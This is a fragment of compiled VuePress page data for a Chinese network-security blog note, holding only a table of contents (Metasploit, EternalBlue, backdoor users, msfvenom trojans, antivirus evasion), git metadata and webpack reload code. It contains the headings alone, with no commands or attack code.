Metesploit","slug":"kali最强渗透工具-metesploit","link":"#kali最强渗透工具-metesploit","children":[{"level":3,"title":"例：永恒之蓝攻击","slug":"例-永恒之蓝攻击","link":"#例-永恒之蓝攻击","children":[]},{"level":3,"title":"创建后门用户并开启远程连接：","slug":"创建后门用户并开启远程连接","link":"#创建后门用户并开启远程连接","children":[]},{"level":3,"title":"使用msfvenom生成远控木马","slug":"使用msfvenom生成远控木马","link":"#使用msfvenom生成远控木马","children":[]},{"level":3,"title":"免杀","slug":"免杀","link":"#免杀","children":[]}]}],"git":{"createdTime":1748156404000,"updatedTime":1748156404000,"contributors":[{"name":"PPPerryPan","email":"perrypan0123@outlook.com","commits":1}]},"filePathRelative":"blogs/xxbj/Network_Security/1_Basic.md"}');import.meta.webpackHot&&(import.meta.webpackHot.accept(),__VUE_HMR_RUNTIME__.updatePageData&&__VUE_HMR_RUNTIME__.updatePageData(u));export{b as comp,u as data};
